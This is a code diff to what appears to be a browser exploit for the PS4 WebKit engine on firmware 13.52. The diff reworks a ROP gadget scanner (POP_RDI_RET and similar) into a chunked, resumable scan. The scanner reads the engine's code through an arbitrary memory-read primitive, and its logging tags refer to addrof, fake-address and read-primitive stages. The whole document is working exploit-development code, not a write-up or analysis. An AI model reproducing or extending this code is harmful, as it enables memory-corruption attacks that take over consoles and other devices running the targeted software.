@@ -19,7 +19,7 @@ let lengthMissStreak = 0;
 const calRetain = [];
 
 const LOG_MAX = 500;
-const BUILD_ID = "cal-20250827h";
+const BUILD_ID = "cal-20250827i";
 const CAL_ALIGN_STEP = 0x4000;
 const ELF_MAGIC = 0x464c457f;
 /** 13.52 retail test anchor — assumed correct unless cal proves otherwise */
@@ -37,10 +37,11 @@ const WALK_LOG_EVERY = parseInt(params.get("walklog") || "1024", 10);
 /** auto vtable walk after Start unless ?vtable=0 */
 const AUTO_VTABLE_WALK = params.get("vtable") !== "0";
 const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|CAL-|GADGET|ELF|BASES|LK-|PASTE|HINT-GROOM/i;
-/** Scan .text for pop/leave gadgets when 13.50 RVAs miss on 13.52 */
+/** Chunked gadget scan — one tap = SCAN_CHUNK read8 steps (OOM-safe on PS4) */
 const SCAN_GADGET_MIN = 0x10000;
 const SCAN_GADGET_MAX = parseInt(params.get("scanmax") || "4800000", 16);
-const SCAN_NEAR_RADIUS = parseInt(params.get("scanrad") || "200000", 16);
+const SCAN_NEAR_RADIUS = parseInt(params.get("scanrad") || "20000", 16);
+const SCAN_CHUNK = parseInt(params.get("scanchunk") || "2048", 10);
 
 const GADGET_CHECKS = [
     ["POP_RDI", "wk_POP_RDI_RET", [0x5f, 0xc3]],
@@ -132,6 +133,7 @@ const SS_VGAD_OK = "wk-vgad-ok";
 const SS_LK_STEP = "wk-cal-lk-step";
 const SS_LK_ERROR = "wk-cal-lk-errorFn";
 const SS_LK_W0 = "wk-cal-lk-w0";
+const SS_GSCAN = "wk-gscan-state";
 
 function $(id) { return document.getElementById(id); }
 
@@ -1151,43 +1153,72 @@ function pickBestGadgetMatch(hits, hintRva) {
     return best;
 }
 
-async function collectGadgetMatches(p, base, pat, minRva, maxRva, maxHits) {
-    const hits = [];
-    const lo = minRva & ~7;
-    for (let rva = lo; rva < maxRva; rva += 8) {
-        const w = read8p(p, base.add32(rva));
-        if (!w) continue;
-        const off = findPatInRead8(bytesFromRead8(w), pat);
-        if (off >= 0) {
-            hits.push(rva + off);
-            if (hits.length >= maxHits) break;
-        }
-        if ((rva & 0x3ffff) === 0)
-            await new Promise(r => setTimeout(r, 0));
-    }
-    return hits;
+function clearGadgetScanState() {
+    try { sessionStorage.removeItem(SS_GSCAN); } catch (_) { }
 }
 
-async function scanOneGadgetRow(p, base, row, minRva, maxRva, quiet) {
-    const name = row[0];
+function tryBakedGadgets(p, base) {
+    if (!tableOff) return null;
+    const found = {};
+    for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
+        const row = GADGET_CHECKS[gi];
+        const key = row[1];
+        const rva = tableOff[key];
+        if (rva == null || !checkGadgetBytes(p, base, rva, row[2]))
+            return null;
+        found[key] = rva;
+    }
+    return found;
+}
+
+function loadGadgetScanState(base) {
+    try {
+        const raw = sessionStorage.getItem(SS_GSCAN);
+        if (!raw) return null;
+        const st = JSON.parse(raw);
+        if (!st || String(st.base) !== String(base)) return null;
+        return st;
+    } catch (_) { return null; }
+}
+
+function saveGadgetScanState(st) {
+    try { sessionStorage.setItem(SS_GSCAN, JSON.stringify(st)); } catch (_) { }
+}
+
+function scanRangeForRow(row) {
     const key = row[1];
-    const pat = row[2];
     const hint = tableOff && tableOff[key] != null ? tableOff[key] : 0;
-    if (!quiet) {
-        mark("GADGET-SCAN", name + " 0x" + minRva.toString(16) + "..0x" + maxRva.toString(16)
-            + (hint ? " hint=0x" + hint.toString(16) : ""));
+    if (hint > 0) {
+        return {
+            minRva: Math.max(SCAN_GADGET_MIN, hint - SCAN_NEAR_RADIUS),
+            maxRva: Math.min(SCAN_GADGET_MAX, hint + SCAN_NEAR_RADIUS),
+        };
     }
-    const hits = await collectGadgetMatches(p, base, pat, minRva, maxRva, 48);
-    const picked = pickBestGadgetMatch(hits, hint);
-    if (picked != null) {
-        if (!quiet) {
-            mark("GADGET-SCAN-HIT", name + " @+0x" + picked.toString(16)
-                + (hits.length > 1 ? " (" + hits.length + " hits, nearest to hint)" : ""));
+    return { minRva: SCAN_GADGET_MIN, maxRva: SCAN_GADGET_MIN + SCAN_NEAR_RADIUS * 2 };
+}
+
+async function scanGadgetChunk(p, base, row, minRva, maxRva, cursor, maxSteps) {
+    const pat = row[2];
+    const hint = tableOff && tableOff[row[1]] != null ? tableOff[row[1]] : 0;
+    let rva = cursor != null ? cursor : (minRva & ~7);
+    let steps = 0;
+    let hit = null;
+    while (rva < maxRva && steps < maxSteps) {
+        const w = read8p(p, base.add32(rva));
+        if (w) {
+            const off = findPatInRead8(bytesFromRead8(w), pat);
+            if (off >= 0) {
+                const cand = rva + off;
+                if (hit == null || Math.abs(cand - hint) < Math.abs(hit - hint))
+                    hit = cand;
+            }
         }
-        return { name, key, rva: picked, hits: hits.length };
+        rva += 8;
+        steps++;
+        if ((steps & 0xff) === 0)
+            await new Promise(r => setTimeout(r, 0));
     }
-    if (!quiet) mark("GADGET-SCAN-MISS", name);
-    return { name, key, rva: null, hits: 0 };
+    return { cursor: rva, hit, done: rva >= maxRva };
 }
 
 function applyScannedGadgets(found, reportLines) {
@@ -1229,63 +1260,118 @@ async function runScanGadgets() {
     busy = true;
     setUi();
     preCalTrim();
+
     const p = window.p;
     const delta = activeDelta();
     const reportHead = [
-        "build=" + BUILD_ID + " (scan)",
+        "build=" + BUILD_ID + " (gadget check)",
         "base=" + base + (delta > 0 ? " expm1=0x" + delta.toString(16) : ""),
     ];
-    state("scanning gadgets…", "warn");
 
-    const found = {};
-    const scanLines = [];
     try {
-        for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
-            const row = GADGET_CHECKS[gi];
-            const key = row[1];
-            const hint = tableOff && tableOff[key] != null ? tableOff[key] : 0;
-            let minRva = SCAN_GADGET_MIN;
-            let maxRva = SCAN_GADGET_MAX;
-            if (hint > 0) {
-                minRva = Math.max(SCAN_GADGET_MIN, hint - SCAN_NEAR_RADIUS);
-                maxRva = Math.min(SCAN_GADGET_MAX, hint + SCAN_NEAR_RADIUS);
-            }
-            state("scan " + row[0] + " (near)…", "warn");
-            let hit = await scanOneGadgetRow(p, base, row, minRva, maxRva, true);
-            if (hit.rva != null) {
-                found[key] = hit.rva;
-                scanLines.push(row[0] + " +0x" + hit.rva.toString(16) + " (near)");
-            }
-        }
+        await new Promise(r => setTimeout(r, 32));
 
-        const missing = GADGET_CHECKS.filter(r => found[r[1]] == null);
-        if (missing.length > 0) {
-            state("wide scan " + missing.length + " missing…", "warn");
-            for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
-                const row = GADGET_CHECKS[gi];
-                const key = row[1];
-                if (found[key] != null) continue;
-                state("wide " + row[0] + "…", "warn");
-                const hit = await scanOneGadgetRow(p, base, row, SCAN_GADGET_MIN, SCAN_GADGET_MAX, true);
-                if (hit.rva != null) {
-                    found[key] = hit.rva;
-                    scanLines.push(row[0] + " +0x" + hit.rva.toString(16) + " (wide)");
-                } else {
-                    scanLines.push(row[0] + " MISS");
-                }
-            }
-        }
-
-        const stillMissing = GADGET_CHECKS.filter(r => found[r[1]] == null);
-        if (stillMissing.length > 0) {
-            reportHead.push("scan FAIL missing: " + stillMissing.map(r => r[0]).join(", "));
-            markGadgetReport(reportHead.concat(["--- scan ---"], scanLines));
-            state("gadget scan incomplete", "bad");
+        const baked = tryBakedGadgets(p, base);
+        if (baked) {
+            clearGadgetScanState();
+            applyScannedGadgets(baked, reportHead.concat(["--- baked table (~16 reads) ---"]));
+            state("gadgets OK from table", "ok");
             return;
         }
 
-        applyScannedGadgets(found, reportHead.concat(["--- scan ---"], scanLines));
-        state("gadget RVAs scanned — tap Verify all", "ok");
+        let st = loadGadgetScanState(base);
+        if (!st) {
+            st = {
+                base: String(base),
+                gi: 0,
+                cursor: 0,
+                found: {},
+                scanLines: [],
+                reportHead,
+            };
+            for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
+                const row = GADGET_CHECKS[gi];
+                const key = row[1];
+                const rva = tableOff && tableOff[key];
+                if (rva != null && checkGadgetBytes(p, base, rva, row[2])) {
+                    st.found[key] = rva;
+                    st.scanLines.push(row[0] + " +0x" + rva.toString(16) + " (table)");
+                }
+            }
+            while (st.gi < GADGET_CHECKS.length && st.found[GADGET_CHECKS[st.gi][1]] != null)
+                st.gi++;
+            if (st.gi < GADGET_CHECKS.length) {
+                const rng = scanRangeForRow(GADGET_CHECKS[st.gi]);
+                st.cursor = rng.minRva & ~7;
+            }
+            mark("GADGET-SCAN", "chunked near scan — " + SCAN_CHUNK + " steps/tap, rad=0x"
+                + SCAN_NEAR_RADIUS.toString(16));
+        }
+
+        if (st.gi >= GADGET_CHECKS.length) {
+            clearGadgetScanState();
+            applyScannedGadgets(st.found, st.reportHead.concat(["--- scan ---"], st.scanLines));
+            state("gadget scan done", "ok");
+            return;
+        }
+
+        const row = GADGET_CHECKS[st.gi];
+        const key = row[1];
+        const rng = scanRangeForRow(row);
+        state("scan " + row[0] + " chunk…", "warn");
+
+        const chunk = await scanGadgetChunk(p, base, row, rng.minRva, rng.maxRva,
+            st.cursor, SCAN_CHUNK);
+        st.cursor = chunk.cursor;
+
+        if (chunk.hit != null) {
+            st.found[key] = chunk.hit;
+            st.scanLines.push(row[0] + " +0x" + chunk.hit.toString(16) + " (near)");
+            st.gi++;
+            if (st.gi < GADGET_CHECKS.length) {
+                const rng2 = scanRangeForRow(GADGET_CHECKS[st.gi]);
+                st.cursor = rng2.minRva & ~7;
+            }
+            saveGadgetScanState(st);
+            if (st.gi >= GADGET_CHECKS.length) {
+                clearGadgetScanState();
+                applyScannedGadgets(st.found, st.reportHead.concat(["--- scan ---"], st.scanLines));
+                state("gadget scan done", "ok");
+            } else {
+                mark("GADGET-SCAN", (st.gi) + "/" + GADGET_CHECKS.length + " done — tap 4b again");
+                state("tap 4b (" + st.gi + "/" + GADGET_CHECKS.length + ")", "warn");
+            }
+            return;
+        }
+
+        if (chunk.done) {
+            st.scanLines.push(row[0] + " MISS (near)");
+            st.gi++;
+            if (st.gi < GADGET_CHECKS.length) {
+                const rng2 = scanRangeForRow(GADGET_CHECKS[st.gi]);
+                st.cursor = rng2.minRva & ~7;
+            }
+            saveGadgetScanState(st);
+            if (st.gi >= GADGET_CHECKS.length) {
+                clearGadgetScanState();
+                const missing = GADGET_CHECKS.filter(r => st.found[r[1]] == null).map(r => r[0]);
+                markGadgetReport(st.reportHead.concat(["--- scan ---"], st.scanLines,
+                    "FAIL missing: " + missing.join(", ")));
+                state("scan incomplete", "bad");
+            } else {
+                mark("GADGET-SCAN", row[0] + " miss — tap 4b (" + st.gi + "/"
+                    + GADGET_CHECKS.length + ")");
+                state("tap 4b (" + st.gi + "/" + GADGET_CHECKS.length + ")", "warn");
+            }
+            return;
+        }
+
+        saveGadgetScanState(st);
+        const pct = rng.maxRva > rng.minRva
+            ? Math.min(99, Math.floor((st.cursor - rng.minRva) * 100 / (rng.maxRva - rng.minRva)))
+            : 0;
+        mark("GADGET-SCAN", row[0] + " @" + pct + "% — tap 4b to continue");
+        state(row[0] + " scan " + pct + "% — tap 4b", "warn");
     } finally {
         busy = false;
         setUi();
@@ -1435,6 +1521,7 @@ async function runStart() {
     lines.length = 0;
     pinnedLines.length = 0;
     calibrated = null;
+    clearGadgetScanState();
 
     const detected = offsetsFor(navigator.userAgent);
     tableOff = (offsetsForKey(detected.key || "13.52").off) || offsetsForKey("13.52").off;
